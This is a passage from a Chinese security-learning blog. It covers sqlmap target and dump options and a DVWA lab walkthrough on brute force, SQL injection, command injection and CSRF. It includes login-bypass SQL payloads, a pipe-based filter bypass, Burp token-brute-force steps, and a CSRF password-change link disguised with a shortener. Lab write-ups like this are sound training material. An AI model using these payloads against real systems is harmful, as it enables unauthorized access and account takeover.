列举指定数据库的表名</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” -D <span class="hljs-string">&quot;指定数据库&quot;</span> -T <span class="hljs-string">&quot;指定表&quot;</span> <span class="hljs-attr">--columns</span><span class="hljs-comment">// 获取表的列名</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” -D <span class="hljs-string">&quot;指定数据库&quot;</span> -T <span class="hljs-string">&quot;指定表&quot;</span> <span class="hljs-attr">--dump</span><span class="hljs-comment">//获取数据库下表的列信息</span><br></code></pre></td></tr></table></figure><h2 id="Sqlmap文件读取目标"><a href="#Sqlmap文件读取目标" class="headerlink" title="Sqlmap文件读取目标"></a>Sqlmap文件读取目标</h2><p> sqlmap支持从不同类型的文件中读取目标进行sql注入探测</p><p>1、<code>-r 从文本文件中读取Http请求作为sql注入探测的目标</code></p><p>2、-x 从sitemap.xml站点地图文件中读取目标检测</p><p>3、-m 从多行文本格式文件读取多个目标，对多个目标进行探测</p><h3 id="1-r-从文本文件中读取Http请求作为sql注入探测的目标"><a href="#1-r-从文本文件中读取Http请求作为sql注入探测的目标" class="headerlink" title="1.-r 从文本文件中读取Http请求作为sql注入探测的目标"></a>1.-r 从文本文件中读取Http请求作为sql注入探测的目标</h3><p>（文本文件中的请求包是burp拦截的请求包来实现 ）</p><p><strong>它和直接使用sqlmap -u “网址” –banner的区别是直接-u所发送的请求包是sqlmap脚本自己构造的可能因为和这个网站原来的请求包不同但是 使用-r指令可以使用这个网站的请求包这样被拦截的几率就降低了</strong></p><p>为了方便我们要先设置一下burp使请求包保存在一个文件中</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242205644.png" alt="屏幕截图 2024-04-24 220309"></p><p>按照次序依次操作最后保存文件名设置为test不用后缀</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242207193.png" alt="image-20240424220713102"></p><p>然后正常的抓包抓到后点击forward直到包被放没了</p><p>然后将我们的包拖到我们的虚拟机中（<strong>注意：如果使本机的靶场切记一定要把127.0.0.1改成我们本机对虚拟机所使用的ip</strong>）</p><p>payload：sqlmap -l test</p><p>如图即可：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242213698.png" alt="屏幕截图 2024-04-24 221246"></p><p>如何去看ip：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242224792.png" alt="屏幕截图 2024-04-24 221423"></p><p>ip是由一层层分配下来的前两个是针对虚拟机的ip具体是哪个可以去看一下虚拟机的网络设置便可确定</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242236877.png" alt="屏幕截图 2024-04-24 223536"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242236729.png" alt="屏幕截图 2024-04-24 223556"></p><p>WLAN后是本机在这个局域网中所分配到的ip</p><h3 id="2-x-从sitemap-xml站点地图文件中读取目标检测"><a href="#2-x-从sitemap-xml站点地图文件中读取目标检测" class="headerlink" title="2.-x 从sitemap.xml站点地图文件中读取目标检测"></a>2.-x 从sitemap.xml站点地图文件中读取目标检测</h3><p>sqlmap -x sqmmap.xml </p><h4 id="如何去判断一个站点是否存在站点地图文件"><a href="#如何去判断一个站点是否存在站点地图文件" class="headerlink" title="如何去判断一个站点是否存在站点地图文件"></a>如何去判断一个站点是否存在站点地图文件</h4><ol><li><strong>直接访问robots.txt文件</strong>：robots.txt是一个文本文件，通常位于网站的根目录下，用于指示搜索引擎爬虫访问哪些页面或不访问哪些页面。在robots.txt文件中，有时会包含站点地图文件的链接。你可以尝试访问该文件，查看是否包含了站点地图文件的链接。</li><li><strong>查看网站的robots meta标签</strong>：有些网站在页面的<head>标签中使用robots meta标签来指示搜索引擎是否可以索引该页面，以及是否可以遵循页面上的链接。在robots meta标签中，有时也会包含站点地图文件的链接。</li><li><strong>尝试访问默认的站点地图URL</strong>：一些网站的站点地图文件位于固定的URL路径下，比如&#x2F;sitemap.xml或&#x2F;sitemap_index.xml。你可以尝试直接访问这些默认的站点地图URL，查看是否存在站点地图文件。</li><li><strong>使用在线工具检查</strong>：有些在线工具可以帮助你检查一个网站是否存在站点地图文件，比如XML站点地图验证器或SEO工具。你可以使用这些工具输入网站的URL，然后查看它们是否能够找到站点地图文件。</li></ol><h3 id="3-m-从多行文本格式文件读取多个目标，对多个url目标进行探测"><a href="#3-m-从多行文本格式文件读取多个目标，对多个url目标进行探测" class="headerlink" title="3.-m 从多行文本格式文件读取多个目标，对多个url目标进行探测"></a>3.-m 从多行文本格式文件读取多个目标，对多个url目标进行探测</h3><p>这个命令可以实现对多个url进行测试txt文件如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404251343874.png" alt="屏幕截图 2024-04-25 134332"></p><p>但是在使用sqlmap扫的时候有 一些操作会询问是否进行  注意进行辨别</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404251351564.png" alt="屏幕截图 2024-04-25 135052"></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2024/04/25/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%20DVWA%E9%9D%B6%E5%9C%BA/"/>
    <url>/2024/04/25/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%20DVWA%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="寒假任务-DVWA靶场通关"><a href="#寒假任务-DVWA靶场通关" class="headerlink" title="寒假任务 DVWA靶场通关"></a>寒假任务 DVWA靶场通关</h1><h2 id="一、Brute-Force"><a href="#一、Brute-Force" class="headerlink" title="一、Brute Force"></a>一、Brute Force</h2><h3 id="1-Low"><a href="#1-Low" class="headerlink" title="1.Low"></a>1.Low</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1."></a>方法1.</h4><p>进入靶场根据题目显然是让我们破解出密码因为安全等级最低因此我们首先想到的是进行暴力破解</p><p>方法：使用爆破工具burpsuit进行常规操作抓包使用密码本也可以同时对账号和密码进行爆破<strong>（注意：攻击类型选择Cluster bomb）如图：</strong></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-23%20141022.png" alt="屏幕截图 2024-01-23 141022"></p><p>爆破结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-22%20202853.png" alt="屏幕截图 2024-01-22 202853"></p><p>说明用户名和密码分别是：admin password</p><p>分别输入提交结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-01-22%20150532.png" alt="屏幕截图 2024-01-22 150532"></p><p><code>源码分析：</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">//先看看是否存在Login参数</span><br>    <br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-comment">//获取用户名并将其存放到变量$user中</span><br>    <br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-comment">//获取密码并将其存放在变量$pass中</span><br>    <br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-comment">//将储存在变量$pass中的密码使用md5加密</span><br>    <br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-comment">//构建SQL语句以users表为查询目标并使用user和password字段进行筛选</span><br>    <span class="hljs-comment">//注意：这段代码存在SQL注入的风险 因为它直接将变量插入到SQL查询字符串中</span><br>    <br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><span class="hljs-comment">//使用mysqli扩展库进行SQl查询，（查在数据库中查变量$query内容）并将查询结果储存在变量$result中，如果查到了就保存用户具体信息没查到就返回false，$result为空</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> )== <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">//如果结果存在只有一条则说明条件成立</span><br>        <br>        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );<br>        <span class="hljs-comment">//查询的结果数据存储在键值对$row中</span><br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><span class="hljs-comment">//根据下面的两行代码可知此操作是获取登录成功的照片</span><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>        <span class="hljs-comment">//登录成功后分别输出 Welcome to the password protected area 和一张照片</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-comment">//这时登录失败的情况输出Username and/or password incorrect.</span><br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>    <span class="hljs-comment">//关闭MySQL数据库的连接（如果关闭失败会返回false）</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2."></a>方法2.</h4><p>通过源代码的分析我们可以发现以源代码存在SQL注入的风险因此我们可以通过对源代码的观察写出对应的SQL注入攻击的语句：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">admin<span class="hljs-symbol">&#x27;or</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> limit <span class="hljs-number">1</span> # <br></code></pre></td></tr></table></figure><p>其中’1’&#x3D;’1’表示条件始终为真limit 1表示只取SQL查询结果的第一行 #表示将后面的代码注释掉</p><p>或者</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>结合源代码可知因为and的优先级大于or所以or’1’&#x3D;’1’可以使整个判断语句为真但是必须要有or </p><p>‘or之前可以是任意值</p><h3 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>这个等级的源码只需要 sleep( 2 ) 即可这段代码表示每次登录失败后会延时2秒只不过需要更久的时间破解其他没有不同</p><p>一样使用burp进行暴力破解即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-19%20165646.png" alt="屏幕截图 2024-02-19 165646"></p><p>根据长度可知admin password为正确的账户和密码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-19%20170646.png" alt="屏幕截图 2024-02-19 170646"></p><h3 id="3-High"><a href="#3-High" class="headerlink" title="3.High"></a>3.High</h3><p>这一关与之前的区别主要在于token</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br></code></pre></td></tr></table></figure><p>Token是在客户端频繁向服务端请求数据服务端频繁的去数据库查询用户名和密码并进行对比判断用户名和密码正确与否并作出相应提示在这样的背景下Token便应运而生</p><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码</p><p><strong>注意：这是因为将一个随机产生的Token加入请求之后，每次请求Token都会改变</strong></p><p>接下来我们开始闯关，首先进行抓包</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20154041.png" alt="屏幕截图 2024-02-20 154041"></p><p>在这里我们要爆破的内容是密码和token，选中然后再设置攻击模式</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20154806.png" alt="屏幕截图 2024-02-20 154806"></p><p>线程设置为一</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175601.png" alt="屏幕截图 2024-02-20 175601"></p><p>在grep-extract中点击add，选择refetch response点击ok</p><p>复制token的值 后面要用</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175053.png" alt="屏幕截图 2024-02-20 175053"></p><p>然后开始设置负载对于第一个参数就是密码我们采用字典爆破，导入字典</p><p>第二个参数是token如下图进行设置 在payload option中粘贴token的值<strong>注意：如果第一次爆破失败第二次要从新抓包在进行爆破因为token的值会改变</strong></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175132.png" alt="屏幕截图 2024-02-20 175132"></p><p>部设置完成开始进行爆破找出不同数字即为最终结果</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175321.png" alt="屏幕截图 2024-02-20 175321"></p><p>由上图可知password为正确密码输入回车即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20175344.png" alt="屏幕截图 2024-02-20 175344"></p><h3 id="4-Impossible"><a href="#4-Impossible" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>此题和上一题的区别为加上了用户锁定一旦登录超过3次用户就会被锁定15秒无法登录</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20212901.png" alt="屏幕截图 2024-02-20 212901"></p><p>所以我们无法在短时间里通过burp将拥护密码爆出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br></code></pre></td></tr></table></figure><p><strong>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入这里因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令</strong></p><h2 id="二、Command-Injection"><a href="#二、Command-Injection" class="headerlink" title="二、Command Injection"></a>二、Command Injection</h2><h3 id="1-Low-1"><a href="#1-Low-1" class="headerlink" title="1.Low"></a>1.Low</h3><p>输入127.0.0.1进行测试类似于ping命令 出现了乱码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220108.png" alt="屏幕截图 2024-02-20 220108"></p><p>找到DVWA中对应的文件 然后把编码形式进行修改，意思就是把utf-8改为gb2312</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220233.png" alt="屏幕截图 2024-02-20 220233"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220321.png" alt="屏幕截图 2024-02-20 220321"></p><p>保存退出如图：</p><p>![屏幕截图 2024-02-20 220108](C:\Users\35358\Pictures\Screenshots\屏幕截图 2024-02-20 220108.png)</p><p>然后试着查看网络配置信息</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20220531.png" alt="屏幕截图 2024-02-20 220531"></p><p>查看系统信息</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20221202.png" alt="屏幕截图 2024-02-20 221202"></p><p>查看目录</p><p>如图：</p><p>![屏幕截图 2024-02-20 221513](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-02-20 221513.png)</p><p>ok 下一关</p><h3 id="2-Medium-1"><a href="#2-Medium-1" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>首先分析源代码</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20222509.png" alt="屏幕截图 2024-02-20 222509"></p><p>会将我们传入的值中的&amp;&amp;和;替换成’ ‘在执行</p><p>但是不影响我们使用&amp;</p><p>注：</p><ul><li><code>&amp;</code> 是一个逻辑运算符，用于表示逻辑与（AND）操作。它用于将两个条件连接起来，只有当两个条件都为真时，整个表达式才为真。</li><li><code>&amp;&amp;</code> 也是一个逻辑运算符，用于表示逻辑与（AND）操作。与 <code>&amp;</code> 不同的是，<code>&amp;&amp;</code> 具有短路特性。这意味着如果第一个条件为假，那么第二个条件将不会被执行，因为整个表达式已经确定为假</li></ul><p>如图：</p><p>![屏幕截图 2024-02-20 222724](<a href="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://gitee.com/dvvss/images/raw/master/imags/屏幕截图</a> 2024-02-20 222724.png)</p><p>ok 下一关</p><h3 id="3-High-1"><a href="#3-High-1" class="headerlink" title="3.High"></a>3.High</h3><p>打开源代码看一下发现好多字符都被替换掉了</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20223105.png" alt="屏幕截图 2024-02-20 223105"></p><p>嘿嘿嘿，仔细看就会发现它过滤的是’| ‘而不是’|’它的有空格所以我们依然可以使用没有空格的’|’来绕过</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20223844.png" alt="屏幕截图 2024-02-20 223844"></p><p>ok 下一关</p><h3 id="4-Impossible-1"><a href="#4-Impossible-1" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>接下来看一下 Impossible 的代码学习一下安全的过滤方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 检查是否提交了表单</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br><span class="hljs-comment">// 检查令牌</span><br><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><span class="hljs-comment">// 获取输入</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$target</span> );<br><br><span class="hljs-comment">// 将 IP 地址拆分为 4 个八位组</span><br><span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br><span class="hljs-comment">// 检查每个八位组是否为整数</span><br><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">sizeof</span>( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br><span class="hljs-comment">// 如果所有 4 个八位组都是整数，则重新组合 IP 地址</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br><span class="hljs-comment">// 确定操作系统并执行 ping 命令</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br><span class="hljs-comment">// Windows</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// *nix</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><br><span class="hljs-comment">// 反馈给最终用户</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 出错，告知用户存在错误的 IP 地址</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 生成令牌</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注：Token是首次登陆时由服务器下发作为客户端进行请求的一个令牌当交互时用于身份验证的一种验证机制当第一次登录后服务器生成一个Token便将此Token返回给客户端以后客户端只需带上这个Token前来请求数据即可无需再次带上用户名和密码</strong></p><h2 id="三、CSRF"><a href="#三、CSRF" class="headerlink" title="三、CSRF"></a>三、CSRF</h2><p>（建议看这一关之前先去看看xss那关）</p><p><strong>csrf跨站请求伪造：是一种对网站的恶意利用通过伪造来自受信任用户的请求来利用受信任的网站本质来说就是在你访问网站信息的同时盗用你的cookie用你的身份进行一些非法操作</strong></p><h3 id="1-Low-2"><a href="#1-Low-2" class="headerlink" title="1.Low"></a>1.Low</h3><p>进入这一关后可以知道它然我们修改密码然后我们进行修改并将其提交</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-20%20225200.png" alt="屏幕截图 2024-02-20 225200"></p><p>由图片可知是Get传参</p><p>只需要攻击者让用户访问如下网址：</p><p><code>http://127.0.0.1/DVWA/digininja-DVWA-34a10d4/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#</code></p><p>受害者点击这个网址的话就会把密码修改为：111</p><p>当然一般谁会点这一大长串连接这是我们可以利用站长工具这样就可以将这个连接重定向到一个短链接中</p><p>就会生成这个短链接：<code>http://suo.im/5LkFdh</code></p><p>但是我们可以curl一下这个链接这样就可以重定向到原来的链接了</p><p>curl的更多用法详见：<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html%E6%8C%BA%E8%AF%A6%E7%BB%86%E7%9A%84%E5%BB%BA%E8%AE%AE%E7%9C%8B%E4%B8%80%E4%B8%8B">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html挺详细的建议看一下</a></p><p>如图：</p><p><img 